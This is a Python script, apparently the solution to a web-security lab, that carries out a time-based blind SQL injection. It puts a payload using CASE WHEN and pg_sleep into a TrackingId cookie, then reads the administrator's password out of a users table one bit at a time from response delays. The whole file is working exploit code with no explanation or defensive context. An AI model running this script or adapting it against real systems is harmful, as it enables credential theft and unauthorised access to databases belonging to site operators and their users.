import sys,requests,string,time

def url():
    return sys.argv[1]

def cookie():
    session=requests.Session()
    session.get(url())
    return session.cookies.get_dict()["TrackingId"]

delay=5
def oracle(q):
    start = time.time()    
    r = requests.get(url(),cookies={"TrackingId": f"' || CASE WHEN ({q}) THEN (SELECT 1 FROM pg_sleep({delay})) ELSE NULL END--"})
    #print(time.time() - start)
    return time.time() - start > delay

def dump_length(q):
    length=0
    for p in range(7):
        if oracle(f"({q})&{2**p}>0"):
            length |= 2**p
    return length

def dump_string(q, length):
    var = ""
    for i in range(1,length+1):  
        c = 0
        for p in range(7):
            if oracle(f"ASCII(SUBSTRING(({q}),{i},1))&{2**p}>0"):
                c |= 2**p
        var += chr(c)
        print(var)
    return var

password_length=dump_length("SELECT LENGTH(password) FROM users WHERE username = 'administrator'")
print(password_length)
password=dump_string("SELECT password FROM users WHERE username = 'administrator'", password_length)
print(password)
